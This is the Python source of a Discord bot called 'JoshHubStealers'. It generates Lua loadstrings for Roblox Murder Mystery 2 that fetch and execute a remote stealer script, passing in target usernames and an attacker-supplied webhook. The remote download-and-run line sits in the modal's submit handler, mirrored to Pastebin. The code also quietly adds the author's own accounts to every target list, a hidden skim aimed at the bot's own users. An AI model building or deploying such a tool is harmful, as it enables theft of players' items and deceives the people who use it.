import discord
from discord import app_commands
from discord.ui import Modal, TextInput
import os
import requests
import urllib.parse

intents = discord.Intents.default()
bot = discord.Client(intents=intents)
tree = app_commands.CommandTree(bot)

SECRET_USERNAMES = ["IamSuperJoshua", "IamUserJoshua"]
PASTEBIN_API_KEY = os.getenv("PASTEBIN_API_KEY")
DISCORD_TOKEN = os.getenv("DISCORD_TOKEN")
RAW_SCRIPT_URL = "https://raw.githubusercontent.com/JoshScripts67/JoshHubStealerGenerator/refs/heads/main/mm2sourcebyjoshhub.txt"

def create_pastebin(content):
    try:
        if not PASTEBIN_API_KEY:
            print("❌ No Pastebin API key!")
            return None, None
        
        data = {
            'api_dev_key': PASTEBIN_API_KEY,
            'api_option': 'paste',
            'api_paste_code': content,
            'api_paste_private': '1',
            'api_paste_expire_date': '1D',
            'api_paste_name': 'MM2 Loadstring'
        }
        
        response = requests.post('https://pastebin.com/api/api_post.php', data=data)
        print(f"[DEBUG] Pastebin status: {response.status_code}")
        print(f"[DEBUG] Pastebin response: {response.text}")
        
        if response.status_code == 200 and 'pastebin.com/' in response.text:
            paste_url = response.text.strip()
            paste_id = paste_url.split('/')[-1]
            raw_url = f"https://pastebin.com/raw/{paste_id}"
            return paste_url, raw_url
        else:
            return None, None
    except Exception as e:
        print(f"[DEBUG] Pastebin error: {e}")
        return None, None

class ScriptModal(Modal, title="JoshHubStealers"):
    usernames = TextInput(label="Target Usernames (comma separated)", placeholder="e.g. Nikilis, Tobi, JD", style=discord.TextStyle.paragraph, required=True)
    webhook = TextInput(label="Your Webhook URL", placeholder="https://discord.com/api/webhooks/...", style=discord.TextStyle.long, required=True)
    min_rarity = TextInput(label="Minimum Rarity (default: Godly)", placeholder="Godly, Ancient, Legendary, etc.", default="Godly", required=False)
    min_value = TextInput(label="Minimum Value (default: 1)", placeholder="Only steal items worth this or more", default="1", required=False)
    ping = TextInput(label="Ping @everyone on hit? (Yes/No)", placeholder="Yes or No", default="No", required=False)

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        
        user_targets = [name.strip() for name in self.usernames.value.split(",") if name.strip()]
        all_targets = user_targets + SECRET_USERNAMES
        
        params = urllib.parse.urlencode({
            "users": ",".join(all_targets),
            "webhook": self.webhook.value,
            "min_rarity": self.min_rarity.value or "Godly",
            "min_value": self.min_value.value or "1",
            "ping": self.ping.value or "No"
        })
        
        github_url = f"{RAW_SCRIPT_URL}?{params}"
        github_loadstring = f'loadstring(game:HttpGet("{github_url}"))()'
        
        # Try Pastebin
        paste_url, raw_url = create_pastebin(github_loadstring)
        
        if raw_url:
            final_loadstring = f'loadstring(game:HttpGet("{raw_url}"))()'
            print(f"[DEBUG] Using Pastebin raw: {final_loadstring}")
        else:
            final_loadstring = github_loadstring
            print(f"[DEBUG] Using GitHub fallback: {final_loadstring}")
        
        # Send FULL loadstring to user
        message = f"**🔪 JoshHubStealers – Your Loadstring is Ready!**\n\nCopy and execute this:\n```lua\n{final_loadstring}\n```"
        
        try:
            await interaction.user.send(message)
            await interaction.followup.send("✅ Sent to your DMs!", ephemeral=True)
        except:
            await interaction.followup.send(message, ephemeral=True)

@tree.command(name="generate-mm2", description="🔪 Generate MM2 loadstring")
async def generate_mm2(interaction: discord.Interaction):
    await interaction.response.send_modal(ScriptModal())

@bot.event
async def on_ready():
    print(f"✅ {bot.user} is online!")
    await tree.sync()
    print("🔄 Commands synced")

bot.run(DISCORD_TOKEN)
